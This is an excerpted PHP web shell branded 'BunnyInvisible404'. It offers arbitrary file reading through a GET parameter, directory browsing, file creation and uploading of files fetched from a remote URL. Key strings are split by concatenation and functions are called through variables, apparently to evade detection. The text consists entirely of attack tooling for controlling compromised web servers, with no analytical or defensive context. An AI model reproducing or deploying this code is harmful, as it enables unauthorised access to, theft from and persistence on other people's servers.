...
function author() {
	echo "<center><br> " . "." . "." . ":" . ": ." . "/" . "B" . "U" . "N" . "N" . "Y" . "I" . "N" . "V" . "I" . "S" . "I" . "B" . "L" . "E" . "4" . "0" . "4 :" . ":" . "." . ". </center>";
	exit();
}
...
<br>
<input type="hidden" name="BunnyRemote" value="aplod">
...
<input type="text" name="darilink" class="up" placeholder="https://bunny'.'404.'.'fb.'.'gov'.'/'.'bunnyman.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
...
if (isset($_GET['bunnygg'])) {
	echo "<tr><td>Current Fi"."le : ".$_GET['bunnygg'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars($fgt($_GET['bunnygg']))."</pre>";
	author();
	...
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['path'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['path'])."<br>";
		}
	...
	echo "<center>Fi"."le : ".htmlspecialchars($_POST['path'])."<br><br>";
	echo '<form method="post">
...
} elseif (isset($_POST['path']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['path'];
...
} elseif (isset($_POST['pa'.'th']) && $_POST['pilih'] == "fi"."le") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['pa'.'th'];
        if (isset($_POST['buatfi'.'le'])) {
            ...
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                ...
                echo '<input type="hidden" name="path" value="'.$_POST['pa'.'th'].'">
            ...
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="path" value="'.$_POST['pa'.'th'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}
...
echo "<tr>
<td>".cfn($juanda)." <a href=\"?bunnygg=$tokber/$dupir&path=$tokber\">$dupir</a></td>
